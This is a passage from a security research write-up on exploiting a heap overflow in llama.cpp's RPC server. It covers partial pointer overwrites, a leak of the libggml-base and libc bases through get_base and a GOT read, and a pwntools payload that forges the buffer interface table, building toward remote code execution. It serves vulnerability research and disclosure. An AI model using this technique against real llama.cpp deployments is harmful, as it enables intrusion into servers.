<li><p>In the best case, I manage to partially overflow the last two bits of the first member - <code>free_buffer</code> - it&#39;s extremely hard to locate gadgets/function within the range of <code>0xffff</code> (<code>0x17000 &lt; addr &lt; 0x26fff</code> translated into offsets within the <code>ggmlbase</code> library)</p>
</li>
<li><p>The <code>free_buffer</code> is called on a harsh condition, where only the <code>buffer</code> is being parsed into the function, eliminating the chances of using <code>ggml_backend_cpu_buffer_get/set_tensor</code> to manage arbitrary-write / arbitrary-read.</p>
</li>
</ol>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1738726606535/2a07a83b-da77-403a-8649-7ddf82ebb306.png" alt=""/></p>
<p>The image above showcased how many methods/gadgets exist in the <code>ggmlbase</code> library, most of <code>GOTs</code> you see are outside of the controllable range <code>0x17000 &lt; addr &lt; 0x26fff</code>, we can&#39;t try to partial overwrite these addresses since controlling more than <code>0xff</code> space required too much resources (Since <code>vmmap</code> base address aligns with <code>0xfffffffffffffff000</code>, the last three nibble is fixed despite the base change, we can still predict during 1-digit difference in multi-thread since we will only need to guess <code>0xf</code> max).</p>
<p>At first few hours of researching on partial-write, this really <em>seemed</em> like a dead-end, on hand, only <code>iface-&gt;free_buffer</code> is partial-write-able since manipulating with other members might corrupt previous members as we always mentioned (for instance, trying to partially write <code>iface-&gt;set_tensor</code> pointer might corrupt <code>iface-&gt;get_tensor</code> pointer, since it came before <code>iface-&gt;set_tensor</code> as the structure defined). On the other hand, <code>free_buffer</code> is called right after the <code>cpy_tensor</code> operation is triggered (meaning that <code>iface-&gt;free_buffer</code> is called immediately after the overflow), while we have a sort of control over the <code>rdi</code> register, the first parameter of <code>iface-&gt;free_buffer</code>, we still have no-way of leaking any pointers, since even if we manage to leak a pointer via manipulating <code>free_buffer</code>, we can&#39;t receive the leak since <code>rpc_free_buffer</code> doesn&#39;t respond the return via the <code>RPC</code> connection.</p>
<p>This is such a tricky scenario, to sum up, all these limitations made <code>iface-&gt;free_buffer</code> not-leak-exploitable, while seemed impossible to exploit other <code>buffer-&gt;iface</code> member. In the meantime, without leaking any pointers, the Paradox-Of-Overflow limits us from doing any further exploitations by forging <code>buffer-&gt;context</code>.</p>
<p>But sometimes, changing the perspective, or simply taking another deeper look, at something really small and tiny, may solve the problem</p>
<h2 id="heading-solving-the-paradox-what-else-can-we-do-when-classic-ptmalloc-doesnt-work">Solving the Paradox: What else can we do when classic <code>ptmalloc</code> doesn&#39;t work?</h2>
<p>If you re-examination the obstacles, you will find that actually, every problem is related to <code>iface-&gt;free_buffer</code>, whether it&#39;s structural properties or its influence over execution.</p>
<ol>
<li><p><code>iface-&gt;free_buffer</code> is the first element/member in the <code>buffer-&gt;iface</code> structure.</p>
<ol>
<li>We can&#39;t try to exploit partial-write on any other members of <code>buffer-&gt;iface</code>, since it will corrupt <code>iface-&gt;free_buffer</code>.</li>
</ol>
</li>
<li><p><code>iface-&gt;free_buffer</code> is called implicitly right after the overflow.</p>
<ol>
<li><p>From <code>1.1</code>, corrupting <code>iface-&gt;free_buffer</code> will crash the program.</p>
</li>
<li><p>Since it&#39;s called implicitly, we can&#39;t leak anything since it does not return anything into the data flow (<code>RPC-Connection</code>)</p>
</li>
</ol>
</li>
</ol>
<p>This is really the key of exploitation here, as we introduced before in case if the <code>iface-&gt;free_buffer</code> is not called exactly after the partial-writing, we could have partial-write the <code>iface-&gt;get_base</code> pointer for something cool. (Since <code>get_base</code> can be called remotely with manipulatable argument, and retrievable data).</p>
<p>In the meantime, I spent time researching possible <code>ptmalloc</code> exploitation vectors, (e.g. <code>large bin attacks</code> ,<code>tcache bin attacks</code>), <strong>all we need is to leak a</strong> <code>libc</code> / <code>ggml-base</code> base address, we don&#39;t even need to achieve write-what-wheres via in order for us to furthermore exploit.</p>
<p>Unfortunately, <code>llama.cpp</code>&#39;s heap management seemed un-exploitable, special features/mechanisms of the system made the classic <code>ptmalloc</code> exploitation applicable. Indeed, we can construct overlapping chunks and manage to achieve <code>uaf</code>s, the <code>buffers</code> global array and limitation during/after <code>deserialize_tensor</code> will stop us from operating on not-<code>rpc</code>-applied chunks, In the meantime, the weird chunk assigning mechanism stops us from going anywhere beyond the <code>tcache bin list</code> - you can&#39;t really fill-up a single <code>tcache bin</code> size file to try to apply for large bins (then try to leak the pointers of them)</p>
<p>One other weird idea that popped out in my head it trying to out-of-bounds read via the <code>cpy_tensor</code> sink that we exploited previously <em>(I am sure this is what people tend to think of after struggling for a period of time on how to leak)</em>. However, remember the reason that we are achieving possible overflow is the wrongful calculation of the <code>src Tensor</code> <em>(</em><code>ggml_nbytes(src)</code>), and the <code>ggml_nbytes()</code> is previously implemented with <code>get_base()</code>, with previously introduced mitigations/patch to present boundary checks on current <code>Tensors</code>. Which sum-up, indeed allows us to overflow the <code>dst Tensor</code>; However, we can&#39;t really read extra from current <code>Tensor</code>.</p>
<p>This is really <em>a pain in the butt</em>. If the the classic <code>ptmalloc</code>, our last resort, have no room to exploit, it seems <em>impossible</em> to exploit and escalate this heap-overflow to anything else than a <code>DoS</code>. Consider the time spent already on this exploit,</p>
<p>After another extremely-tiring few rounds of looking back into <code>llama.cpp</code>&#39;s source codes (taking lots of time and thought), breaking and rethinking the entire process over and over again. <strong><em>Unexpectedly and lucky</em></strong>, I was able to find a part that we ignored, where the final solution is initiated, by solving simply one minor part of the paradox, the entire paradox unwrapped itself, and achieving <code>RCE</code>.</p>
<h3 id="heading-nullpointernoexception">NullPointerNoException</h3>
<pre><code><span><span>void</span> <span>ggml_backend_buffer_free</span><span>(<span>ggml_backend_buffer_t</span> buffer)</span> </span>{
    <span>if</span> (buffer == <span>NULL</span>) {
        <span>return</span>;
    }

    <span>if</span> (buffer-&gt;iface.free_buffer != <span>NULL</span>) {
        buffer-&gt;iface.free_buffer(buffer);
    }
    <span>delete</span> buffer;
}
</code></pre>
<p>This is a code segment snipped from the <code>ggml_backend_buffer_free</code> method, can be called via <code>rpc</code> endpoint via <code>rpc_server::free_buffer-&gt;ggml_backend_buffer_free</code>; Additionally called during <code>rpc_server::~rpc_server</code>, <code>for (auto buffer : buffers) -&gt; ggml_backend_buffer_free</code>, called after every <code>RPC</code> connection as the <em>auto-freeing</em> behaviour for every left over <code>buffer</code> (Also the reason why the <a target="_blank" href="http://iface.free"><code>iface.free</code></a><code>_buffer</code> will be right triggered after the overflow, resulting in our <em>Paradox-of-Overflow</em>).</p>
<p>An interesting part, among this very small code segment, before <code>buffer-&gt;</code><a target="_blank" href="http://iface.free"><code>iface.free</code></a><code>_buffer(buffer);</code> is called, the <code>buffer-&gt;</code><a target="_blank" href="http://iface.free"><code>iface.free</code></a><code>_buffer</code> is actually checked if is <code>null</code> <em>(if the pointer is null)</em> for some reason. This check doesn&#39;t really make since the <code>buffer</code> structure is allocated by the <code>rpc</code> server. One possible explanation is the <code>ggml_backend_cpu_buffer_from_ptr_i</code> definition at <code>ggml/src/ggml-backend.cpp:1911</code>, where the <code>.free_buffer</code> is set to <code>NULL</code>. According to the comment, <em>(</em><code>// ptr is not owned by the buffer, so it does not need to be freed</code>) where the <code>buffer</code> is initialized from other <code>buffer</code> structure (when called/initialized via <code>ggml_backend_cpu_buffer_from_ptr</code>), thus not require to be freed. This feature didn&#39;t raised a lot of attention of at the beginning, as what it seems like, this enabled us is nothing more but avoiding crashing right after the overflow. But what this applied with the partial writing technique with some extra boundary calculation techniques, is fun and explorable.</p>
<p>You might ask why this is interesting, fun, and explorable, this will require us to take a look back into the <em>paradox of partial writing</em>, what it basically is, summarizing is:</p>
<p>Changing <code>free_buffer</code> will crash the program since we don&#39;t know any address.</p>
<ul>
<li><p>even if we partial overwrite <code>free_buffer</code>, which indeed avoid crash:</p>
<ul>
<li><p>meaningless other than avoiding crashing, we can&#39;t receive any return from the redirected execution flow to break the <em>paradox-of-overflow</em></p>
</li>
<li><p>we can overwrite anything beyond <code>free_buffer</code></p>
</li>
</ul>
</li>
</ul>
<p>What the <em>paradox of partial-writing</em> represents is partial-writing is useless. However, with the help of the new <code>buffer-&gt;</code><a target="_blank" href="http://iface.free"><code>iface.free</code></a><code>_buffer != NULL</code> check this time, <strong>what this indirectly means to us is that:</strong></p>
<ol>
<li><p><strong>The</strong> <a target="_blank" href="http://iface.free"><code>iface.free</code></a><code>_buffer</code> can be set to a known address (<code>NULL</code>) to avoid crashing;</p>
</li>
<li><p>We can modify <strong>members</strong> that&#39;s later to the <a target="_blank" href="http://iface.free"><code>iface.free</code></a><code>_buffer</code> member <strong>since writing process of</strong> <a target="_blank" href="http://iface.free"><code>iface.free</code></a><code>_buffer</code> will no longer crash the execution flow.</p>
</li>
</ol>
<p>What this furthermore mean is that, <strong>this simple, extra examination provided to us the solution / break of the <em>paradox-of-overwriting</em>!</strong> Despite the fact that we still hold no <code>libc</code> / <code>ggml-base</code> base addresses, we are able to partial write other <code>buffer-&gt;iface</code> member that have entirely controllable first-parameter register and receivable return, essential factors that make leaking possible, theoretically.</p>
<p>Nevertheless, <strong>this doesn&#39;t mean that we have an easy exploitation router right after this</strong>, we still need to face the problem of finding the proper partial-write target that located around the <code>0xfff</code> range of the partial-overwritten method, within the linked <code>ggml-base</code> library, in which the method allows to leak an entire dynamic-linked loaded pointer address, while we only control over the first-parameter register <em>(this is because only way to receive receivable return is via the</em> <code>RPC</code> server endpoints to access <code>buffer-&gt;iface</code> method, while these endpoints only deserialize <code>buffer</code> as the only argument), lastly extreme precise <code>ne[]</code> / <code>nb[]</code> size calculation to return <code>ggml_nbytes()</code> the right offset/position in order partial-write, which is not easy exploitation at all.</p>
<blockquote>
<p>Little head-ups here, even we solve the <em>paradox-of-partial-writing</em>, we still can&#39;t solve the <em>paradox-of-overflow</em> by overwriting the <code>buffer-&gt;context</code> pointer, since it will corrupt <code>get_tensor</code> / <code>set_tensor</code> method pointers that goes before them, making it invalid/null during the exploitation on the <code>buffer-&gt;context</code> since it reference the methods from the same <code>buffer</code> structure.</p>
</blockquote>
<p>However, nothing is <em>impossible</em>; let&#39;s see how we can solve the further exploitation piece by piece, layer by layer, and then beautifully construct a <strong><em>leak</em></strong>.</p>
<h2 id="heading-constructing-leak-piece-by-piece-layer-by-layer">Constructing Leak: Piece by Piece, Layer by Layer</h2>
<p>The objective right now is to manage to construct a leak, thanks to previous research, the partial-writing technique seem to be the right way to go, additionally with to the <em>NullPointerNoException</em> exploitation, we are able to target <code>buffer-&gt;iface-&gt;get_base</code> as our target of partial overwrite.</p>
<blockquote>
<p>The reason why <code>iface-&gt;get_base</code> gave us more space to exploit, is because <code>iface-&gt;get_base</code> can be called via <code>case RPC_CMD_BUFFER_GET_BASE -&gt; server.buffer_get_base -&gt; ggml_backend_buffer_get_base -&gt; buffer-&gt;iface.get_base(buffer);</code> , while the return value of <code>ggml_backend_buffer_get_base</code> can be returned as <code>response.base_ptr = reinterpret_cast&lt;uint64_t&gt;(base);</code> directly via the <code>RPC</code> endpoint, directly leak-able.</p>
</blockquote>
<p>However, finding the right manipulation address for <code>buffer-&gt;iface-&gt;get_base</code>, as we state previously, we will still have to find the right gadget with in the <code>0xfff</code> range, which allows us to leak in case only <code>rdi</code> register is manipulatable, lastly precise control the <code>ggml_nbtyes()</code> calculation <em>(I really like to repeat things)</em>.</p>
<h3 id="heading-leak-no1-right-range-right-leak">Leak No.1: Right range, Right leak</h3>
<blockquote>
<p>Note that even though targeting <code>memset_tensor</code> / <code>set_tensor</code> / <code>get_tensor</code> as target of partial writing is possible. (I did spend a while looking for these that are practical) However, their argument is less controllable (as there is internal processing of the parameters) and for the most important part - don&#39;t really return anything, thus considered not the best work-ons on the leaking process</p>
</blockquote>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1738726637460/f66050dc-503b-4088-9ffe-8d4aa2100a55.png" alt=""/></p>
<p>Looking into <code>gdb</code>, we can see that the pointer for <code>ggml_backend_cpu_buffer_free_buffer</code> (<code>buffer-&gt;iface-&gt;get_base</code>) is located in <code>0x7ffff7e7b19c</code>, <code>ggml/src/libggml-base.so</code> DLL with offset <code>0x1319c</code>. As we previously introduced the limitation of partial-writing, our maximum accepted gadget offset with be with in the range of <code>0x13fff</code>.</p>
<p>As the call-chain of the invokable <code>get_base</code> via <code>RPC</code> endpoint ( following <code>RPC_CMD_BUFFER_GET_BASE -&gt; server.buffer_get_base -&gt; ggml_backend_buffer_get_base -&gt; buffer-&gt;iface.get_base(buffer); -&gt; ggml_backend_cpu_buffer_get_base</code>) With only the <code>request.remote_ptr</code> (<code>ggml/src/ggml-rpc/ggml-rpc.cpp:804</code> can be passed into the <code>ggml_backend_buffer_get_base</code> function as <code>rdi</code>), we will have to find a method in <code>libggml-base.so</code>, near the offset <code>0x1319c</code>, that takes a address as a parameter, while returns a proper DLL-loaded address.</p>
<p>While regarding the passed-address must be a valid <code>buffer</code> address <em>(</em><code>buffer</code> is examined as <code>if (buffers.find(buffer) == buffers.end()) {</code>, <code>ggml/src/ggml-rpc/ggml-rpc.cpp:805</code>, we can&#39;t try to pass in arbitrary heap address that we know via <code>alloc_buffer</code>) and there&#39;s less of method that functions to return an address of a pointer, I started to look for <code>getters</code> in <code>ggml/src/ggml-backend.cpp</code>, right about 1700 lines near the original definition of <code>ggml_backend_cpu_buffer_get_base</code> (this does take me more than a while), I find this interesting <code>getter</code> - <code>ggml_backend_buffer_type_t ggml_backend_buffer_get_type(ggml_backend_buffer_t buffer)</code>:</p>
<pre><code><span><span>ggml_backend_buffer_type_t</span> <span>ggml_backend_buffer_get_type</span><span>(<span>ggml_backend_buffer_t</span> buffer)</span> </span>{
    <span>return</span> buffer-&gt;buft;
}
</code></pre>
<p>In the first few rounds of researching on <code>ggml/src/ggml-backend.cpp</code>, chances of the <code>buffer-&gt;buft</code> being a informational leak was ignored since I really looks like the <code>buffer-&gt;buft</code> is just pointing to a mangement-sort-of chunk on the heap. Nevertheless, it was further noticed that <code>buffer-&gt;buft</code> is actually a <code>ggml_backend_buffer_type</code> type! (<code>ggml_backend_buffer_type_t-&gt;ggml_backend_buffer_type</code>), pointing to the <code>ggml_backend_cpu_buffer_type::ggml_backend_cpu_buffer_type</code> in <code>ggml/src/ggml-backend.cpp</code> offset <code>+0xb20</code> (<code>0x4ab20</code>)! A valid DDL-loaded address! <em>(The name of this method is indeed confusing enough, as it says returns the type of the</em> <code>ggml_backend_buffer</code>, it actually returns a reference to the <code>type</code> structure)</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1738726655805/cdb9822d-b937-469f-932e-452c014e0f14.png" alt=""/></p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1738726675798/c1dad71e-caff-4307-98d0-64885ba3bb7f.png" alt=""/></p>
<p>It seems like despite the fact that <code>ggml_backend_buffer_get_type</code> and <code>ggml_backend_cpu_buffer_get_base</code> is 1700 lines away from each other, they are still loaded at a pretty adjacent address with a difference of <code>0x7c1</code> <em>(Note that we are not calculating the difference of</em> <code>ggml_backend_buffer_get_base</code> and <code>ggml_backend_buffer_get_type</code>, since actually <code>ggml_backend_cpu_buffer_get_base</code> is bind on the targeted <code>iface-&gt;get_buffer pointer)</code>. <code>0x7c1</code> is a really proper offset, theoretically the best target during partial-writing because the DDL is aligned as <code>0xfff</code> as we mentioned previously. However, re-mentioning from the <em>Paradox-of-Partial-Writing</em> part we mentioned before, the fact is that we cannot just write a half-byte (not with the overflow we have), we will still have to guess a half-byte however we are promised to guess the right one with maximum of <code>0xf</code> (16) attempts, which is pretty nice for pwn exploitation, since most canary brute-forcing or heap spraying requires much more attempts!</p>
<h4 id="heading-ggmlnbtyes-ne-nb"><code>ggml_nbtyes</code>: <code>ne[]</code> + <code>nb[]</code> = ?</h4>
<p>Now we have a victim /estination, and a target /anipulation for partial-writing, the only requirement for the leakage is finding the right combination for <code>ne[]</code> / <code>nb[]</code> of <code>Tensor</code> to overflow the right place at the right time, in order to partial write these essential bits of <code>buffer-&gt;iface-&gt;free_buffer</code>.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1738726690599/6ffa925f-15c1-40af-89f1-fba1b836b370.png" alt=""/></p>
<p>From calculating the distance between <code>dst-&gt;data</code> (<code>memcpy</code> destination) to <code>(dst-&gt;buffer)+8(size_t)+2</code> (we used minus since heap grows upward), the offset required for us to overwrite the last two bytes (<code>LSB</code>) of the <code>iface-&gt;get_base</code> pointer is <code>282</code>, <code>0x11a</code></p>
<p>As we introduced a few parts of the implementation of <code>ggml_nbytes()</code> in the <em>Prerequisites</em> part of the research, we didn&#39;t really delve deep into the details of the size calculation it, for partial writing, we must control very carefully the overflown bytes <em>(God I really like to repeat things!)</em>, as a reminder, this is how the of <code>ggml_nbytes()</code> is calculated:</p>
<pre><code><span><span>size_t</span> <span>ggml_nbytes</span><span>(<span>const</span> struct ggml_tensor * tensor)</span> </span>{
    <span>size_t</span> nbytes;
    <span>const</span> <span>size_t</span> blck_size = ggml_blck_size(tensor-&gt;type);
    <span>if</span> (blck_size == <span>1</span>) {
        nbytes = ggml_type_size(tensor-&gt;type);
        
        <span>for</span> (<span>int</span> i = <span>0</span>; i &lt; GGML_MAX_DIMS; ++i) {
            nbytes += (tensor-&gt;ne[i] - <span>1</span>)*tensor-&gt;nb[i];
        }
    }
    <span>else</span> {
        nbytes = tensor-&gt;ne[<span>0</span>]*tensor-&gt;nb[<span>0</span>]/blck_size;
        <span>for</span> (<span>int</span> i = <span>1</span>; i &lt; GGML_MAX_DIMS; ++i) {
            nbytes += (tensor-&gt;ne[i] - <span>1</span>)*tensor-&gt;nb[i];
        }
    }
    <span>return</span> nbytes;
}
</code></pre>
<p>As the <code>tensor-&gt;ne[i]</code> <em>(shape)</em> and <code>tensor-&gt;nb[i]</code> <em>(stride)</em> arrays are full controllable, <code>blck_size</code> being partially controllable (determined by own property, the returned <code>nbytes</code> is basically calculated by <code>(tensor-&gt;ne[0] - 1)*tensor-&gt;nb[0]/blck_size+(tensor-&gt;ne[i] - 1)*tensor-&gt;nb[i]</code> (optimized when <code>blck_size=1</code>, possibly for optimization behavior when dealing with a great amount of tensors).</p>
<p>This calculation is sometimes a <em>pain-in-the-butt</em> when lots of adjustment happens in the <code>buffer-&gt;context</code> / <code>buffer</code> structure, thus we created these tools -&gt; <a target="_blank" href="https://github.com/Protosec-Research/ggml-nbytes"><code>Protosec-Research/ggml-nbytes</code></a> It firstly creates a rainbow table that maps out the <code>shape</code> , <code>strides</code> and <code>type_traits[type].blck_size;</code> with the corresponded <code>nbytes</code>, <em>(This is a relatively small-calculation required task, generating a</em> <code>254 KB</code> table required less than few seconds). Furthermore, with the generated rainbow table to can directly look up proper <code>shape / dimensions</code>/ <code>strides</code> with specified <code>nbytes</code></p>
<p>Since we have a <code>buffer-&gt;type</code> of <code>2</code>, <code>ggml_blck_size(tensor-&gt;type)</code> of <code>0x20</code>, we found the <code>ggml_nbytes</code> array parameter of <code>ne[] = {32*3,32*3,32*3,63}</code>, <code>nb[] = {10,1,1,1}</code>. This gave us the size of <code>((32*3)*10//32)+((32*3-1)*1)+((32*3-1)*1)+(63-1*1)</code> -&gt; <code>30+95+95+62=282</code>, exactly the offset we are looking for, for now, we just need to construct <code>Tensor src</code> using the parameter, while using <code>set_tensor</code> to the <code>dst-&gt;data</code> chunk with specific data. <em>(Remember not to corrupt the header information for chunk</em> <code>dst-&gt;buffer</code>, in this case we need set offset <code>248</code> to the header structure, as we probably mentioned before)</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1738726748120/45027bf7-abb2-42fd-a3e1-30ef7ebac506.png" alt=""/></p>
<p>We manipulated <code>iface-&gt;get_base</code>&#39;s lower-two bytes to our payload <em>(</em><code>b&#39;aaaa&#39;</code>s) without <strong>interfering any rest parts of the pointer.</strong> Now we just need to manipulate this part of the pointer to <code>ggml_backend_buffer_get_type</code>, then trigger the <code>buffer_get_base</code> original call chain (<code>RPC_CMD_BUFFER_GET_BASE -&gt; server.buffer_get_base -&gt; ggml_backend_buffer_get_base -&gt; buffer-&gt;iface.buffer_get_base(buffer); -&gt; ggml_backend_cpu_buffer_get_base</code>) thought <code>RPC</code> endpoint, the return value of manipulated <code>ggml_backend_buffer_get_type</code> will be returning as a part of the <code>response</code> variable in <code>ggml-rpc.cpp</code>, and we will be able to retrieve it through the socket <code>RPC</code> connections.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1738726762258/eda8b57b-3715-4782-a9af-7b9b36c158b4.png" alt=""/></p>
<p>Here we successfully leaked the address of <code>ggml_backend_buffer_get_type</code> <em>(ignoring the miss-alignment)</em>, as we mentioned previously, this is a <code>libggml-base.so</code> loaded DDL address, by calculating it&#39;s fixed offset to the <em>(we used two variable in the</em> <code>exp.py</code>, the <code>ggml_bae</code> and <code>ggml_begin</code>, this is because <code>vmmap</code> and <code>pwntools</code>&#39;s <code>ELF()</code> interpretation are based in a different base. The <code>vmmap</code> offset in <code>pwndbg</code> is segmented to three parts), we now have the <code>libggml-base.so base</code> address, this allowed us to redirect the execution flow to arbitrary methods loaded in <code>libggml-base.so</code>. Furthermore allowed us to:</p>
<ol>
<li><p>Fake <code>buffer-&gt;iface</code> structure method pointers to original DLL address to avoid any malfunction / unexpected corruption to the <code>buffer</code> structure, allowed us to explore the possibility of <code>buffer-&gt;context</code> pointer, allowing us to mess with <code>paradox-of-overflow</code></p>
</li>
<li><p>Calculate the <code>got</code> address of a function loaded in the DLL.</p>
</li>
</ol>
<p>Here the first ability is the leakage of <code>libggml-base.so</code> is most essential to us, since <em>(re-explaining and repeating)</em> as we mentioned before, the sanitization / patches for previous exploitations are based on <code>buffer_get_context</code> and <code>buffer_get_size</code>, by manipulating the <code>buffer-&gt;context</code> pointer, we can bypass and re-establish the <code>read-what-wheres</code> and <code>write-what-wheres</code> previously we introduced, and by leaking the <code>ggml</code> library loaded <code>memcpy</code> got allowed us to to find the reference of this method to its standard library, and here, we are going construct our second leak.</p>
<blockquote>
<p>If you wonder why we need to leak another library, the answer is in order for us to receive a reverse shell via the heap-overflow, where we don&#39;t have direct control over a <code>rwx</code> segment as we do in stack-overflows, the best way is to execute commands via <code>system()</code> and pass in command-stored address as an argument. Except when these <code>system()</code> class directly loaded in the DLL, or called previously in the program (Lazy binding). Otherwise, the only way for us to reference is via the standard DDLs such as <code>libc.so.6</code> <em>(By the way, I really don&#39;t like to say DLL since it really sounds like a thing that people say only when they are in context of Windows, however I considered it bit confusing to sat</em> <code>libc</code> all the time since two DLL are mentioned in this write-up, so why not?)</p>
</blockquote>
<h3 id="heading-leak-no2-paradox-of-overflow-got-tables">Leak No.2: Paradox-of-Overflow, GOT Tables.</h3>
<p>Compared to our No.1 leak, Leak No.2 is comparably simpler. In order to leak the <code>libc.so.6</code> base address, the best way for us to do such is to break the <em>Paradox-of-Overflow</em> we mentioned previously, it&#39;s easily solved since we have entire leaks on the <code>libggml-base</code> base address, the fake <code>buffer-&gt;context</code>, the final objective in our <em>Paradox-of-Overflow</em>, can be easily manipulated without any effects on functioning pointers.</p>
<p>The key here is to use the <code>RPC</code> native <code>ggml_backend_cpu_buffer_get_tensor</code> to leak a <code>GOT</code> value that tells us about the <code>libc</code> base. By looking into the <code>ELF(&#39;lib-ggml.so&#39;)</code>&#39;s <code>.got</code> reference, we can find our favorite <code>.got[&#39;memcpy&#39;]</code> - we chose <code>memcpy</code> not because it&#39;s our favorite, rather it has already been called previously, we can directly leak it&#39;s DLL address without <code>dl_runtime_resolve</code> and lazy-binding whatever;</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1738726793941/c4a85533-525f-41bc-b72b-bf2cefffaa36.png" alt=""/></p>
<p>To begin with, we will firstly construct a fake <code>ggml_backend_buffer</code> table <em>(The</em> <code>buffer-&gt;iface</code> structure) using the known <code>ggml_base</code> address + known-fixed offset of the method, the only trick here is you can try to keep <code>free_buffer</code> as <code>NULL</code>, leave <code>buffer-&gt;size</code> the same as it was. <code>memcpy</code>&#39;s <code>GOT</code> address can be calculated using the <code>ggml_begin</code> address + <code>ggml.got[&#39;cpy&#39;]</code>.</p>
<pre><code>    ggml = ELF(<span>&#39;./libggml-base.so&#39;</span>, checksec=<span>False</span>)
    payload = flat({               
        <span>248</span>:[
            fake_ggml_backend_buffer_table(
                free_buffer = <span>0</span>,
                get_base = ggml_base + get_base_offset,
                init_tensor = ggml_base + init_tensor_offset,
                memset_tensor = ggml_base + memset_tensor_offset,
                set_tensor = ggml_base + set_tensor_offset,
                get_tensor = ggml_base + get_tensor_offset,
                cpy_tensor = ggml_base + cpy_tensor_offset,
                clear = ggml_base + clear_offset,
                reset = ggml_base + reset_offset,
                buft = <span>0x0</span>,
                context = ggml_begin + ggml.got[<span>&#39;memcpy&#39;</span>] - <span>0x30</span>,
                size = <span>0x110</span>,
                usage = <span>0x0</span>,
            ),
            p64(<span>0x111</span>)
        ]
    })
</code></pre>
<p>Notice here how we change the <code>buffer-&gt;context</code> pointer into <code>ggml.got[&#39;memcpy&#39;]-0x30</code>, <strong>as we mentioned the</strong> <code>p0 = (size_t) ggml_backend_buffer_get_base(tensor-&gt;buffer)</code> is eventually just a wrapper for <code>buffer-&gt;context</code>, changing the <code>p0</code> will simply fail the entire <code>request.tensor.data + request.offset &lt; p0, request.tensor.data + request.offset &gt;= p0 + buffer-&gt;size</code> patch, that we should&#39;ve mentioned in <code>ggml/src/ggml-rpc/ggml-rpc.cpp:924</code>. We left a <code>0x30</code> space is for context pointer to leave a little chunky room for <code>p0</code> examinations.</p>
<p>Now, all we have to do is to call <code>ggml_backend_cpu_buffer_get_tensor</code> on this manipulated <code>buffer</code> structure, because we left the beloved <code>free_buffer</code> as <code>NULL</code>, this <code>buffer</code> will never be freed, since we change the <code>buffer-&gt;context</code>, <code>RPC</code> sanitization will believe we are trying to read a legit <code>alloc_buffer</code> allocated context address, vomiting out the content of it:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1738726806818/0443b71c-18be-44fb-9141-8c379f220187.png" alt=""/></p>
<p>The content of <code>memcpy[got]</code> leaked! <em>(since we specified the size of</em> <code>ggml_backend_cpu_buffer_get_tensor</code>, only <code>0x8</code> bytes of data is being vommited, you can output as much as the <code>GOT</code> table you want, of-course). <em>(Here the</em> <code>libc.so.6</code> mapped such a wide a range of address, <code>memcpy</code> is located in offset <code>0x1a12c0</code> of the <code>libc.so.6</code> base, we are pretty lucky that <code>libggml-base.so</code> have such small range that allows us to exploit partial writing.)</p>
<p>With the leak of <code>libc.so.6</code>, we should be able access the a considerable of method that can help us, such as <code>system()</code>, <code>execve()</code>, <code>syscall()</code>, <code>one_gadgets</code> that can leads to possible directly <code>bin/sh</code> connection. However, trying to remote-code execute on the server isn&#39;t as easy as how it seems like.</p>

<p>Remote-Code Execution, even now the mitigations on the <code>write-what-wheres</code> / <code>read-what-wheres</code> bypassed, is still not an easy thing to achieve. Previous exploitation-al write-ups on <code>Llama.cpp</code> were created before the the mitigations implementation were implemented. This allowed them to arbitrary pass things into <code>buffer-&gt;iface</code> methods listen in the <code>RPC</code> server and changing the <code>buffer-&gt;iface</code> pointers will be enough for them to RCE.</p>
<p>However, we are dealing a much more harder <em>(or rather, secure)</em> version of <code>Llama.cpp</code>, we can no longer mess with things that arbitrary since checks are implemented <em>everywhere</em>. The past exploitation doesn&#39;t work anymore as <code>Llama.cpp</code> checks if the passed in <code>buffer</code> pointers belongs to the globally-managed <code>buffers</code>, passing in a external pointer will just set the pointer to <code>NULL</code>. At the meantime, you can&#39;t just manipulate the execution flow to <code>one_gadgets</code>, since we are not dealing with <code>CTFs</code> challenges that simple routes <code>stdin/stdout</code> to/from the <code>elf</code> - executing <code>/bin/sh</code> won&#39;t really does anything (<em>Probably suspend the process and that&#39;s all?</em>). we will need to execute custom commands to establish shell connections.</p>
<p>Fortunately, past exploitation methodology on <code>NullPointerNoException</code> still works, we can call an arbitrary method, with manipulated <code>rdi</code> (first-parameter). But this still gave us a lot of limitations,</p>
<p>Most of time that we have control over the execution flow with a controllable argument, we will try to find a call wrapper <em>(that imitates another method with parameter related to argument For example,</em> <code>ggml_backend_alloc_buffer</code> is a call-wrapper for <code>ggml_backend_buft_alloc_buffer(ggml_backend_get_default_buffer_type(backend), size)</code>)</p>
<p>Nevertheless, firstly, we say that we have control over the <code>rdi</code> , but we actually only have parts / selective controll over it, as we introduced the <code>buffers</code> examinations, the passed in <code>rdi</code> must be a globally-managed <code>buffer</code> structure stored in <code>buffers[]</code>, at the meantime, call-wrappers usually call-wraps the argument itself <em>(call another method, pass-in the original argument)</em>, it is <em>impossible</em> to find these ideal call-wrappers that does something we will want in <code>ROPS</code>, such as cll <code>rdi+0x10</code>, then pass <code>rdi+0x20</code> as argument, <em>at least impossible in</em> <code>libggml-base.so</code> and most DDLs <code>RPC</code> server loaded, that I went through the source-codes of.</p>
<blockquote>
<p>Head-ups, we can&#39;t just edit the globally stored <code>buffers[]</code> - It&#39;s stored globally to begin with and we will need to leak it&#39;s address to modify it will the bypassed <code>write-what-wheres</code>, that&#39;s very sad</p>
</blockquote>
<p>And the thing about <code>buffer</code> structures is, as much as it&#39;s controllable to us, <strong>the first member, -</strong> <code>free_buffer</code> - the <code>buffer</code> stands for as a argument, is limited and not fully controllable to us as it&#39;s valid pointer address, or NULL, and most (<em>every</em>) of time we try to call a <code>system()</code> for shell, that pointer will be pointing some address with data <em>(For example, the commands that we want to execute)</em> that doesn&#39;t contains valid instruction while being not executable at all. <em>(It will be another story if we can find a actual</em> <code>rwx</code> segment that we know the address of, but re-stating, that will be another totally different story)</p>
<p>This is what I noted during the exploitation:</p>
<ul>
<li><p><code>bin/sh</code> won&#39;t work at all, we are on a self-designed <code>rpc</code> socket system, not as these CTF contest that directly monitors on <code>stdout</code> / <code>stdin</code></p>
</li>
